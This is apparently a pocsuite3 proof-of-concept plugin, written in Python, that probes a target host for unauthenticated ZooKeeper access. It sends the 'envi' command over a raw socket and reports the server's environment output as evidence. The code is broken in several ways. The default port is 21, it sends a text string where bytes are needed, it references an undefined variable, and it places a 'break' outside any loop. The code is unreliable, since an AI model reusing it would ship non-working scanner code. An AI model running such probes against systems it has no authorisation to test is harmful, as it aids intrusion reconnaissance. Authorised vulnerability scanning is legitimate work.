# -*- coding: utf-8 -*-
# author: seven
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY
from pocsuite3.lib.core.threads import run_threads
import socket


class ZookeeperUnauthPOC(POCBase):
    vulID = ''
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 8, 2020'
    createDate = 'Aug 8, 2020'
    name = 'zookeeper'
    appName = 'zookeeper'
    appVersion = 'v1.0.0'
    vulType = '未授权访问'
    protocol = 'zookeeper'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 21

        result = {}
        try:
            s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            s.connect((host,int(port)))
            s.send('envi')
            info = s.recv(4096)
            if 'zookeeper.version' in info:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = '{}:{}'.format(pr.hostname,port)
                result['extra'] = {}
                result['extra']['evidence'] = info.strip()
                break
        except:
            pass
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

register_poc(ZookeeperUnauthPOC)